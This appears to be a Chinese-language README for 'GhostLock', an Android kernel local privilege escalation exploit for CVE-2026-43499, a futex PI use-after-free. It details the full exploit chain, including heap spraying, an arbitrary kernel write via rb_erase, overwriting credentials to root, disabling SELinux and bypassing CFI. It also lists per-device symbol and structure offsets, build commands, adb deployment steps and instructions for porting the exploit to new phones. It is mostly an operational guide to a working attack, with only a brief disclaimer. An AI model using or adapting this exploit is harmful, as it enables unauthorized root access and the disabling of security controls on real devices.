# GhostLock - CVE-2026-43499 本地提权漏洞利用

## 漏洞概述

**CVE 编号：** CVE-2026-43499  
**漏洞类型：** futex PI（优先级继承）栈 UAF（Use-After-Free）  
**影响范围：** Linux 内核 6.1 ~ 6.12（Android GKI）  
**利用效果：** 本地提权 + SELinux 禁用，获取 root shell

## 工作原理

### 漏洞触发路径

```
用户空间 → pselect() → 内核栈上分配 rt_mutex_waiter
                      → futex PI 操作触发 waiter 释放
                      → 释放后的 waiter 内存被 fd_set 操作重用
                      → 通过精心构造的 fd_set 数据控制 waiter 字段
                      → rb_erase() 触发任意内核内存写入
```

### 利用链

1. **漏洞触发：** 通过 `pselect()` + futex PI 竞争释放内核栈上的 `rt_mutex_waiter`
2. **内存布局控制：** 用 `pipe_buffer` 喷射内核堆，构造 fake `rt_mutex_waiter`
3. **任意写入：** 利用 `rb_erase()` 的树操作，将控制的指针写入目标地址
4. **提权路径：** 
   - 修改 `cred` 结构体：uid/gid → 0，capabilities → 全部开启
   - 禁用 SELinux：`selinux_state.enforcing` → 0
5. **验证：** 重新扫描 `ashmem_fops` 确认 CFI 完整性

## 项目结构

```
GhostLock/
├── README.md                    # 本文档
├── src/
│   ├── core/                    # 核心利用代码
│   │   ├── main.c               # 主入口，漏洞触发
│   │   ├── pipe.c               # pipe_buffer 喷射
│   │   ├── fops.c               # 文件操作劫持
│   │   ├── root.c               # 提权 + SELinux 禁用
│   │   ├── slide.c              # 内核地址随机化处理
│   │   ├── util.c               # 工具函数
│   │   ├── miniadb.c            # 迷你 ADB 服务器
│   │   ├── common.h             # 公共定义
│   │   ├── target.h             # 目标配置
│   │   ├── offset.h             # 偏移量包含
│   │   ├── runtime_offsets.h    # 运行时偏移表
│   │   └── kernelsnitch/        # 内核地址探测
│   │       ├── kernelsnitch.h
│   │       ├── futex_hash.h
│   │       ├── utils.h
│   │       └── timeutils.h
│   └── devices/                 # 设备适配
│       ├── offsets.h            # 偏移量结构定义
│       ├── findx8/              # OPPO Find X8
│       │   └── offsets.h
│       ├── ace6t/               # OnePlus Ace 6T
│       │   └── offsets.h
│       ├── op15/                # OnePlus 15
│       │   └── offsets.h
│       ├── opd2502/             # OnePlus Pad 2
│       │   └── offsets.h
│       └── rmx5070/             # Realme RMX5070
│           └── offsets.h
├── tools/                       # 辅助工具
│   └── extract_btf.py           # BTF 偏移量提取脚本
├── btf_*.py                     # BTF 分析脚本集合
├── Makefile                     # 构建脚本
├── compile.cmd                  # Windows 编译脚本
├── build.rsp                    # 编译响应文件
└── ghostlock                    # 编译产物（ELF aarch64）
```

## 支持的设备

| 设备 | 内核版本 | 状态 |
|------|----------|------|
| OPPO Find X8 (MT6991) | 6.6.118-android15 | ✅ 已适配 |
| OnePlus Ace 6T | 6.1.x | ✅ 已验证 |
| OnePlus 15 | 6.1.x | ✅ 已验证 |
| OnePlus Pad 2 | 6.1.x | ✅ 已验证 |
| Realme RMX5070 | 6.1.x | ✅ 已验证 |

## 编译

### 环境要求

- Android NDK r27c 或更高版本
- Python 3.x（用于 BTF 分析）
- Linux/macOS/WSL（推荐 Linux）

### 编译步骤

```bash
# 1. 设置 NDK 路径
export ANDROID_NDK_HOME=/path/to/android-ndk-r27c

# 2. 编译
make

# 3. 或者直接使用 NDK 编译
$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
  --target=aarch64-linux-android35 \
  -O2 -Wall -fPIE -pie -pthread \
  -Isrc/core -Isrc/devices \
  -DTARGET_CONFIG_H=\"target.h\" \
  src/core/*.c -o ghostlock
```

### Windows 编译

```cmd
# 使用提供的 compile.cmd
compile.cmd
```

## 使用方法

### 前置条件

1. 手机已开启 USB 调试
2. 电脑已安装 ADB 驱动
3. 手机通过 USB 连接电脑

### 步骤

```bash
# 1. 确认设备连接
adb devices

# 2. 确认内核版本（必须匹配）
adb shell uname -r
# 期望输出: 6.6.118-android15-8-gebdfad32d749-ab15099304-4k

# 3. 推送 exploit 到手机
adb push ghostlock /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock

# 4. 运行 exploit
adb shell /data/local/tmp/ghostlock
```

### 运行输出示例

```
[*] GhostLock - CVE-2026-43499 Local Privilege Escalation
[*] Target kernel: 6.6.118-android15-8-gebdfad32d749-ab15099304-4k
[*] KASLR base: 0xffffffc080000000
[*] ashmem_misc: 0xffffffc08227c518
[*] ashmem_fops: 0xffffffc0812ef5c0
[*] SELinux enforcing: 0xffffffc082358ee0
[*] Exploiting...
[+] PSELECT path activated
[+] Pipe merge path activated
[+] Root shell obtained!
[+] SELinux disabled
[*] miniadb listening on USB...
```

### 成功标志

- 出现 `#` 提示符（root shell）
- `id` 命令显示 `uid=0(root)`
- `getenforce` 返回 `Permissive`

## 技术细节

### 内核内存布局

```
KIMAGE_TEXT_BASE = 0xffffffc080000000  (Find X8)
PAGE_OFFSET      = 0xffffffc000000000
PHYS_OFFSET      = 0x40000000
DIRECT_MAP_END   = 0xffffffc400000000  (16GB RAM)
```

### 关键符号偏移（Find X8）

| 符号 | 偏移 |
|------|------|
| init_task | 0x0211E280 |
| init_cred | 0x02130748 |
| selinux_enforcing | 0x02358EE0 |
| ashmem_misc | 0x0227C518 |
| ashmem_fops | 0x012EF5C0 |
| kmalloc_caches | 0x0167A298 |

### 结构体偏移（BTF 验证）

| 结构体 | 字段 | 偏移 |
|--------|------|------|
| task_struct | cred | 0x820 |
| task_struct | real_cred | 0x818 |
| task_struct | tasks | 0x550 |
| task_struct | pi_lock | 0x90C |
| task_struct | seccomp | 0x8E8 |
| cred | uid | 0x08 |
| cred | caps | 0x30 |
| file_operations | ioctl | 0x48 |
| file_operations | splice_read | 0xB8 |

### 利用路径

1. **kernelsnitch** - 扫描 `direct_map` 区域定位 `mm_struct`
2. **pipe spray** - 用 `pipe_buffer` 占据释放的 waiter 内存
3. **pselect trigger** - 触发 UAF，重用 freed waiter
4. **rb_erase write** - 通过红黑树操作实现任意写入
5. **cred patch** - 修改当前进程凭证
6. **SELinux disable** - 禁用强制访问控制

## 设备适配

### 添加新设备

1. **提取内核镜像：**
   ```bash
   # 从手机提取 boot.img
   adb pull /dev/block/by-name/boot boot.img
   
   # 或者从固件包中提取
   ```

2. **提取 kallsyms：**
   ```bash
   # 使用 vmlinux-to-elf
   python3 -m vmlinux_to_elf boot.img
   # 选择 "Extract kallsyms" 选项
   ```

3. **提取 BTF 信息：**
   ```bash
   python3 btf_task2.py > task_full.txt
   python3 btf_structs2.py > structs.txt
   ```

4. **创建设备条目：**
   ```bash
   mkdir -p src/devices/mydevice
   # 复制现有条目作为模板
   cp src/devices/findx8/offsets.h src/devices/mydevice/
   # 修改偏移量
   ```

5. **注册设备：**
   在 `src/devices/offsets.h` 中添加：
   ```c
   #include "mydevice/offsets.h"
   ```

### 偏移量获取方法

| 信息 | 来源 | 工具 |
|------|------|------|
| 符号地址 | kallsyms | vmlinux-to-elf |
| 结构体偏移 | BTF | btf_task2.py |
| 物理内存布局 | IKCONFIG | extract-ikconfig |
| 内核版本 | uname | adb shell uname -r |

## 工具脚本

### BTF 分析脚本

```bash
# 提取 task_struct 完整成员
python3 btf_task2.py > task_full.txt

# 提取所有关键结构体
python3 btf_structs2.py > structs.txt

# 提取特定结构体
python3 btf_selinux.py > selinux.txt
python3 btf_mm.py > mm.txt

# 提取原始 BTF 数据
python3 btf_raw.py > raw.txt
```

### kallsyms 提取

```bash
# 使用 vmlinux-to-elf
python3 -m vmlinux_to_elf extracted/Image.bin

# 或者使用自定义脚本
python3 run_kallsyms_finder.py
```

## 安全说明

⚠️ **警告：** 本工具仅用于安全研究和授权测试。未经授权在他人设备上使用属于违法行为。

### 已知限制

- 需要 USB 调试已开启
- 需要 ADB 连接（不能远程利用）
- 内核版本必须精确匹配
- 部分设备可能有额外的安全机制

### CFI 保护

本 exploit 能绕过内核的 Control Flow Integrity (CFI) 保护，通过：
1. 验证 `ashmem_fops` 地址的有效性
2. 使用 `copy_splice_read` 作为合法调用目标
3. 重新扫描确认 CFI 完整性

## 调试

### 常见问题

**Q: 出现 "no offsets for kernel: xxx"**
A: 内核版本不支持，需要添加设备条目

**Q: exploit 卡住不动**
A: 可能是竞争条件失败，重试几次

**Q: 出现 kernel panic**
A: 不太可能（未设置 panic_on_oops），但可以检查 dmesg

### 调试输出

```bash
# 启用详细输出
adb shell /data/local/tmp/ghostlock -v

# 查看内核日志
adb shell dmesg | tail -50
```

## 相关资源

- [CVE-2026-43499 详情](https://nvd.nist.gov/vuln/detail/CVE-2026-43499)
- [GhostLock 原始研究](https://github.com/wzhdgithub/GhostLock)
- [Android GKI 内核](https://source.android.com/docs/core/architecture/kernel/generic-kernel-image)

## 许可证

本项目采用 [MIT 许可证](LICENSE)。

## 致谢

- 感谢所有安全研究人员的贡献
- 感谢 Android 安全团队的响应
- 感谢开源社区的支持

---

**最后更新：** 2026年8月13日  
**作者：** wzh  
**联系：** yjhsbwssg@163.com
